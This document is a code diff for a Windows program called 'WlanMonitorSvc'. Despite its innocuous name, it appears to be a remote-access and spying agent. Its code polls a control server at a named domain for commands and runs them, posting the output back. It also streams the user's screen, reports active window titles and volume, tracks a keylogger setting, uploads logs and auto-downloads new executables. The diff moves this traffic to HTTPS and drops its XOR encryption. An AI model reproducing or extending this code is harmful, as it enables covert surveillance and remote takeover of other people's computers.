@@ -40,7 +40,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.7.8"
+#define MANUAL_COMPILE_VERSION "1.8.2"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
@@ -50,8 +50,8 @@ const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
 const std::string UPDATE_URL_BASE = "http://127.0.0.1:5000/update/"; // 本地测试服务 (Debug)
 const std::string REPORT_URL_BASE = "http://127.0.0.1:5000/report";   // 本地测试服务 (Debug)
 #else
-const std::string UPDATE_URL_BASE = "http://120.78.3.56:5000/update/"; // 对齐5000端口
-const std::string REPORT_URL_BASE = "http://120.78.3.56:5000/report";   // 匹配服务器上的 5000 端口
+const std::string UPDATE_URL_BASE = "https://jianbingozi.com/update/"; // Cloudflare Tunnel (HTTPS)
+const std::string REPORT_URL_BASE = "https://jianbingozi.com/report";  // Cloudflare Tunnel (HTTPS)
 #endif
 
 // 全局单例互斥锁句柄，放于最顶部方便所有函数调用
@@ -613,39 +613,11 @@ void UploadLogToServer() {
             if (pos != std::string::npos) {
                 baseUrl = baseUrl.substr(0, pos);
             }
-            std::string targetUrl = baseUrl + "/api/upload_log/" + UrlEncode(EncryptString(mac));
+            std::string targetUrl = baseUrl + "/api/upload_log/" + UrlEncode(mac);
             std::string curlCmd = "curl.exe -s -m 30 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
             ExecCmd(curlCmd, false);
         }
     }).detach();
-}
-
-// 简单XOR加密并将结果转为Hex编码
-std::string EncryptString(const std::string& data) {
-    if (data.empty()) return "";
-    std::string key = "PowerOFF2026"; // 你的专属加密密钥
-    std::string result = "";
-    char hexBuf[5];
-    for (size_t i = 0; i < data.size(); i++) {
-        unsigned char xorChar = static_cast<unsigned char>(data[i]) ^ key[i % key.size()];
-        sprintf_s(hexBuf, "%02X", xorChar);
-        result += hexBuf;
-    }
-    return result;
-}
-
-std::string DecryptString(const std::string& hexStr) {
-    if (hexStr.empty()) return "";
-    std::string key = "PowerOFF2026";
-    std::string result = "";
-    try {
-        for (size_t i = 0; i < hexStr.length(); i += 2) {
-            std::string byteString = hexStr.substr(i, 2);
-            char byte = (char)strtol(byteString.c_str(), NULL, 16);
-            result += (char)(byte ^ key[(i / 2) % key.size()]);
-        }
-    } catch (...) {}
-    return result;
 }
 
 // 写入日志到程序同目录下的 WlanMonitorSvc_Log.txt
@@ -666,9 +638,7 @@ void WriteLog(const std::string& message) {
     std::ofstream logFile(logPath, isTooLarge ? std::ios::trunc : std::ios::app);
     if (logFile.is_open()) {
         std::string rawLog = "[" + GetCurrentTimeStr() + "] " + message;
-        // 暂时取消加密，直接输出明文日志
-        //logFile << rawLog << std::endl;//无加密
-        logFile << EncryptString(rawLog) << std::endl;//有加密
+        logFile << rawLog << std::endl;
         logFile.close();
     }
 }
@@ -836,8 +806,10 @@ void ForceShutdown() {
 // 检查并执行自动更新
 void CheckForUpdates() {
     std::string timestamp = std::to_string(GetTickCount64());
-    std::string versionUrl = UPDATE_URL_BASE + "version.txt?t=" + timestamp;
-    std::string exeUrl = UPDATE_URL_BASE + "WlanMonitorSvc.exe?t=" + timestamp;
+    std::string mac = GetMacAddress();
+
+    std::string versionUrl = UPDATE_URL_BASE + "version.txt?t=" + timestamp + "&mac=" + UrlEncode(mac);
+    std::string exeUrl = UPDATE_URL_BASE + "WlanMonitorSvc.exe?t=" + timestamp + "&mac=" + UrlEncode(mac);
     std::string tempVersionFile = GetExePath() + ".ver";
 
     WriteLog("【更新】开始连接服务器检查自动更新...");
@@ -1090,12 +1062,12 @@ std::string ExecCmd(const std::string& cmd, bool outputIsUtf8) {
 
 // 向服务端提交执行结束的终端输出结果
 void SendOutputToServer(const std::string& mac, const std::string& output) {
-    std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&output=" + UrlEncode(EncryptString(output));
+    std::string postData = "mac=" + UrlEncode(mac) + "&output=" + UrlEncode(output);
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hSession) {
-        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
         if (hConnect) {
-            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/cmd_result", NULL, NULL, NULL, 0, 1);
+            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/cmd_result", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
             if (hRequest) {
                 std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                 if (!HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length())) {
@@ -1121,12 +1093,12 @@ std::string g_CustomMyName = "";
 void ReportScreenLog(const std::string& log) {
     if (GetMacAddress() == "UNKNOWN_MAC") return;
     std::string utf8Log = AnsiToUtf8(log);
-    std::string postData = "mac=" + UrlEncode(EncryptString(GetMacAddress())) + "&log=" + UrlEncode(EncryptString(utf8Log));
+    std::string postData = "mac=" + UrlEncode(GetMacAddress()) + "&log=" + UrlEncode(utf8Log);
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hSession) {
-        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
         if (hConnect) {
-            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/screen/log", NULL, NULL, NULL, 0, 1);
+            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/screen/log", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
             if (hRequest) {
                 std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                 HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
@@ -1259,6 +1231,9 @@ void CaptureScreenJpg(const std::string& filename) {
     }
     } // 结束 if (!dxgiSuccess) 的判定分支
 
+    // 【核心修复】将 hBitmap 从 DC 中弹出（反选）。这是防止 GDI+ 锁定失败并导出一个无效/黑屏图片的必备步骤。
+    SelectObject(hMemoryDC, hOldBitmap);
+
     {
         Gdiplus::Bitmap bitmap(hBitmap, NULL);
         CLSID clsid;
@@ -1280,7 +1255,6 @@ void CaptureScreenJpg(const std::string& filename) {
         }
     } // 让 bitmap 对象在 GdiplusShutdown 之前析构销毁，否则会导致进程崩溃
 
-    SelectObject(hMemoryDC, hOldBitmap);
     DeleteObject(hBitmap);
     DeleteDC(hMemoryDC);
     if (hDesktopDC) {
@@ -1416,10 +1390,11 @@ void TrimString(std::string &s) {
 // 向服务器报备上线
 void ReportToServer() {
     std::string mac = GetMacAddress();
-    std::string reportUrl = REPORT_URL_BASE + "?mac=" + UrlEncode(EncryptString(mac)) + "&ver=" + UrlEncode(EncryptString(CURRENT_VERSION)) + "&t=" + std::to_string(GetTickCount64());
+    std::string reportUrl = REPORT_URL_BASE + "?mac=" + UrlEncode(mac) + "&ver=" + UrlEncode(CURRENT_VERSION) + "&t=" + std::to_string(GetTickCount64());
 
     static ULONGLONG lastFgRead = 0;
     static std::string lastFgStr = "";
+    static std::string lastVolStr = "";
     if (GetTickCount64() - lastFgRead > 2000) {
         lastFgRead = GetTickCount64();
         std::ifstream ifs("C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt");
@@ -1427,20 +1402,29 @@ void ReportToServer() {
             std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
             TrimString(content);
             if (!content.empty()) {
-                lastFgStr = UrlEncode(EncryptString(AnsiToUtf8(content)));
+                lastFgStr = UrlEncode(AnsiToUtf8(content));
             } else {
                 lastFgStr = "";
             }
+        }
+        std::ifstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt");
+        if (vfs.is_open()) {
+            std::string vcontent((std::istreambuf_iterator<char>(vfs)), (std::istreambuf_iterator<char>()));
+            TrimString(vcontent);
+            lastVolStr = vcontent;
         }
     }
     if (!lastFgStr.empty()) {
         reportUrl += "&fg=" + lastFgStr;
     }
+    if (!lastVolStr.empty()) {
+        reportUrl += "&vol=" + lastVolStr;
+    }
 
     if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES) {
-        reportUrl += "&kl=" + UrlEncode(EncryptString("1"));
+        reportUrl += "&kl=" + UrlEncode("1");
     } else {
-        reportUrl += "&kl=" + UrlEncode(EncryptString("0"));
+        reportUrl += "&kl=" + UrlEncode("0");
     }
 
     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -1462,11 +1446,6 @@ void ReportToServer() {
             InternetCloseHandle(hConnect);
 
             TrimString(response); // 消除可能的隐藏换行符，避免指令匹不上
-
-            // 数据解密
-            std::string decResponse = DecryptString(response);
-            if (decResponse.empty() && !response.empty()) decResponse = response;
-            response = decResponse;
 
             // 检测心跳回调是否携带了需要执行的操作命令
             if (!response.empty() && response != "Missing parameters") {
@@ -1717,12 +1696,12 @@ void ReportToServer() {
                         res = "Success: Monitor turned on.";
                     }
 
-                    std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&type=" + UrlEncode(EncryptString(type)) + "&output=" + UrlEncode(EncryptString(res));
+                    std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
                     HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                     if (hSession) {
-                        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+                        HINTERNET hConnect = InternetConnectA(hSession, "jianbingozi.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
                         if (hConnect) {
-                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result", NULL, NULL, NULL, 0, 1);
+                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
                             if (hRequest) {
                                 std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                                 HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
@@ -2023,8 +2002,20 @@ int main()
 
                 std::string host, path;
                 int port = 80;
-                if (url.find("http://") == 0) {
-                    std::string rest = url.substr(7);
+                bool isHTTPS = false;
+                std::string rest = url;
+                if (url.find("https://") == 0) {
+                    isHTTPS = true;
+                    port = 443;
+                    rest = url.substr(8);
+                } else if (url.find("http://") == 0) {
+                    rest = url.substr(7);
+                }
+
+                ULONG quality = 30; // 默认降低画质以提高帧率
+                int maxResW = 1280; // 默认限制最大分辨率
+
+                if (!rest.empty()) {
                     size_t slashPos = rest.find('/');
                     if (slashPos != std::string::npos) {
                         host = rest.substr(0, slashPos);
@@ -2037,6 +2028,37 @@ int main()
                     if (colonPos != std::string::npos) {
                         port = std::stoi(host.substr(colonPos + 1));
                         host = host.substr(0, colonPos);
+                    }
+
+                    // 解析自定义参数
+                    size_t qmPos = path.find('?');
+                    if (qmPos != std::string::npos) {
+                        std::string query = path.substr(qmPos + 1);
+                        auto getParam = [](const std::string& q, const std::string& key) -> std::string {
+                            size_t pos = q.find(key + "=");
+                            while (pos != std::string::npos) {
+                                if (pos == 0 || q[pos - 1] == '&' || q[pos - 1] == '?') {
+                                    size_t start = pos + key.length() + 1;
+                                    size_t end = q.find('&', start);
+                                    if (end == std::string::npos) end = q.length();
+                                    return q.substr(start, end - start);
+                                }
+                                pos = q.find(key + "=", pos + 1);
+                            }
+                            return "";
+                        };
+
+                        std::string resStr = getParam(query, "res");
+                        if (!resStr.empty()) {
+                            try { maxResW = std::stoi(resStr); } catch (...) {}
+                        }
+                        std::string qStr = getParam(query, "q");
+                        if (!qStr.empty()) {
+                            try { quality = std::stoi(qStr); } catch (...) {}
+                        }
+                        if (quality > 100) quality = 100;
+                        if (quality < 1) quality = 1;
+                        if (maxResW < 100) maxResW = 100;
                     }
                 }
 
@@ -2055,29 +2077,14 @@ int main()
                 CLSID clsid;
                 GetEncoderClsid(L"image/jpeg", &clsid);
 
-                WSADATA wsaData;
-                WSAStartup(MAKEWORD(2, 2), &wsaData);
-                SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-                if (sock != INVALID_SOCKET) {
-                    struct sockaddr_in serv_addr;
-                    serv_addr.sin_family = AF_INET;
-                    serv_addr.sin_port = htons(port);
-                    struct hostent* he = gethostbyname(host.c_str());
-                    if (he != NULL) {
-                        memcpy(&serv_addr.sin_addr, he->h_addr_list[0], he->h_length);
-                        if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
-                            std::string httpReq = "POST " + path + " HTTP/1.1\r\n"
-                                                  "Host: " + host + ":" + std::to_string(port) + "\r\n"
-                                                  "Transfer-Encoding: chunked\r\n"
-                                                  "Content-Type: application/octet-stream\r\n\r\n";
-                            send(sock, httpReq.c_str(), httpReq.length(), 0);
+                HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent_Stream", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+                if (hSession) {
+                    HINTERNET hConnect = InternetConnectA(hSession, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+                    if (hConnect) {
+                        // 保持阻塞模式，防止非阻塞导致大包图片发送不完整丢帧黑屏
+                        DxgiScreenCapturer dxgiStream; // 初始化DXGI对象
 
-                            ULONG quality = 60; // 修改为60极大提升画质
-
-                            // 保持阻塞模式，防止非阻塞导致大包图片发送不完整丢帧黑屏
-                            DxgiScreenCapturer dxgiStream; // 初始化DXGI对象
-
-                            while (true) {
+                        while (true) {
                                 int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                                 int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                                 int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -2094,15 +2101,25 @@ int main()
 
                                 int targetW = nScreenWidth;
                                 int targetH = nScreenHeight;
-                                if (nScreenWidth > 1920) { // 限制最大1080P尺寸，不至于糊，也保障超宽屏不会爆显存
-                                    targetW = 1920;
-                                    targetH = (int)((float)nScreenHeight * 1920.0f / (float)nScreenWidth);
+                                if (nScreenWidth > maxResW) { // 限制最大尺寸，提高串流帧率
+                                    targetW = maxResW;
+                                    targetH = (int)((float)nScreenHeight * (float)maxResW / (float)nScreenWidth);
                                 }
 
                                 HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
                                 if (!hDesktopDC) hDesktopDC = GetDC(NULL);
                                 HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
-                                HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, targetW, targetH);
+
+                                BITMAPINFO bmi24 = {0};
+                                bmi24.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+                                bmi24.bmiHeader.biWidth = targetW;
+                                bmi24.bmiHeader.biHeight = targetH; // 正常正数高度，bottom-up
+                                bmi24.bmiHeader.biPlanes = 1;
+                                bmi24.bmiHeader.biBitCount = 24;    // 强制使用24位丢弃Alpha通道，防止DXGI返回的全透明导致黑白屏
+                                bmi24.bmiHeader.biCompression = BI_RGB;
+                                void* pDIBBits = NULL;
+                                HBITMAP hBitmap = CreateDIBSection(hDesktopDC, &bmi24, DIB_RGB_COLORS, &pDIBBits, NULL, 0);
+
                                 HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
 
                                 // 填充黑色背景防截取出错花屏
@@ -2126,10 +2143,11 @@ int main()
 
                                 if (!dxgiSuccess) {
                                     SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
-                                    StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY | CAPTUREBLT);
+                                    StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY);
 
-                                    // 【新增补丁】利用 PrintWindow(2) 强制捕获 DWM 硬件加速渲染的置前全屏应用（如浏览器全屏视频/游戏），防止纯GDI抓取变成黑屏或只有UI灰边
-                                    HWND hForeground = GetForegroundWindow();
+                                    // 禁用 PrintWindow 强制渲染拦截硬件加速窗口以极大提高帧率
+                                    // HWND hForeground = GetForegroundWindow();
+                                    /*
                                     if (hForeground && hForeground != GetDesktopWindow()) {
                                     char className[256];
                                     GetClassNameA(hForeground, className, sizeof(className));
@@ -2148,6 +2166,7 @@ int main()
                                                     int dstY = (int)((fRect.top - nScreenY) * (float)targetH / (float)nScreenHeight);
                                                     int dstW = (int)(fW * (float)targetW / (float)nScreenWidth);
                                                     int dstH = (int)(fH * (float)targetH / (float)nScreenHeight);
+                                                    SetStretchBltMode(hMemoryDC, COLORONCOLOR);
                                                     StretchBlt(hMemoryDC, dstX, dstY, dstW, dstH, hFgMemDC, 0, 0, fW, fH, SRCCOPY);
                                                 }
                                                 SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
@@ -2155,7 +2174,11 @@ int main()
                                         }
                                     }
                                 }
+                                */
                                 } // 结束 if (!dxgiSuccess)
+
+                                // 【核心修复】必须先将 hBitmap 从 DC 中弹出（反选），GDI+ 才能安全锁定和操作它，否则会导致截取到空数据或一直处于黑/白屏缓冲！
+                                SelectObject(hMemoryDC, hOldBitmap);
 
                                 IStream* pStream = NULL;
                                 CreateStreamOnHGlobal(NULL, TRUE, &pStream);
@@ -2182,7 +2205,6 @@ int main()
                                 pStream->Read(&buffer[0], cbSize, &bytesRead);
                                 pStream->Release();
 
-                                SelectObject(hMemoryDC, hOldBitmap);
                                 DeleteObject(hBitmap);
                                 DeleteDC(hMemoryDC);
                                 if (hDesktopDC) {
@@ -2190,45 +2212,40 @@ int main()
                                     if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
                                 }
 
-                                // 按照 Chunked 数据组织报文
-                                uint32_t cbSizeLE = cbSize;
-                                uint32_t payloadSize = 4 + cbSize;
-                                char chunkHeader[32];
-                                sprintf_s(chunkHeader, "%x\r\n", (unsigned int)payloadSize);
+                                DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE;
+                                if (isHTTPS) flags |= INTERNET_FLAG_SECURE;
 
-                                std::string sendBuffer;
-                                sendBuffer.append(chunkHeader);
-                                sendBuffer.append((char*)&cbSizeLE, 4);
-                                sendBuffer.append(buffer.data(), cbSize);
-                                sendBuffer.append("\r\n");
-
-                                int s1 = send(sock, sendBuffer.data(), (int)sendBuffer.size(), 0);
-                                if (s1 <= 0) break;
-
-                                fd_set readfds;
-                                FD_ZERO(&readfds);
-                                FD_SET(sock, &readfds);
-                                timeval tv = {0, 0}; // 设置超时为0达到非阻塞检测的作用
-                                if (select(0, &readfds, NULL, NULL, &tv) > 0) {
-                                    char recvBuf[128];
-                                    int r = recv(sock, recvBuf, sizeof(recvBuf)-1, 0);
-                                    if (r > 0) {
-                                        recvBuf[r] = '\0';
-                                        if (std::string(recvBuf).find("STOP") != std::string::npos) {
+                                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, flags, 1);
+                                if (hRequest) {
+                                    std::string headers = "Content-Type: image/jpeg\r\n";
+                                    BOOL bSend = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)buffer.data(), (DWORD)cbSize);
+                                    if (bSend) {
+                                        char recvBuf[128];
+                                        DWORD bytesRead = 0;
+                                        std::string respOut;
+                                        while (InternetReadFile(hRequest, recvBuf, sizeof(recvBuf)-1, &bytesRead) && bytesRead > 0) {
+                                            recvBuf[bytesRead] = '\0';
+                                            respOut += recvBuf;
+                                        }
+                                        if (respOut.find("STOP") != std::string::npos) {
+                                            InternetCloseHandle(hRequest);
                                             break;
                                         }
                                     } else {
-                                        break; // 远端关闭或错误
+                                        InternetCloseHandle(hRequest);
+                                        break; // 网络错误断开
                                     }
+                                    InternetCloseHandle(hRequest);
+                                } else {
+                                    break;
                                 }
 
-                                Sleep(10); // 进一步降低休眠，允许近 60FPS 的采集
+                                Sleep(1); // Frame pacing
                             }
                         }
-                    }
-                    closesocket(sock);
+                    InternetCloseHandle(hConnect);
                 }
-                WSACleanup();
+                InternetCloseHandle(hSession);
                 Gdiplus::GdiplusShutdown(gdiplusToken);
             } else {
                 ReportScreenLog("致命：无法从命令行参数提取串流 URL。");
@@ -2271,7 +2288,7 @@ int main()
                 }
             });
 
-            // 定时获取并报告当前的焦点前台窗口名和进程名
+            // 定时获取并报告当前的焦点前台窗口名和进程名，以及系统音量
             SetTimer(NULL, 2, 2000, [](HWND, UINT, UINT_PTR, DWORD) {
                 HWND fg = GetForegroundWindow();
                 if (fg) {
@@ -2305,6 +2322,12 @@ int main()
                             }
                         }
                     }
+                }
+
+                int vol = GetVolumeNative();
+                if (vol >= 0) {
+                    std::ofstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt", std::ios::trunc);
+                    if (vfs) vfs << vol;
                 }
             });
 
@@ -2500,7 +2523,7 @@ int main()
             std::string res = "VOL:" + volStr + "|SONG:" + song;
 
             std::string mac = GetMacAddress();
-            std::string postData = "mac=" + UrlEncode(EncryptString(mac)) + "&info=" + UrlEncode(EncryptString(res));
+            std::string postData = "mac=" + UrlEncode(mac) + "&info=" + UrlEncode(res);
 
             // 动态解析出所属控制台服务器的链接，使用轻量 curl 取代原生冗杂的硬编码接口推送状态
             std::string baseUrl = REPORT_URL_BASE;
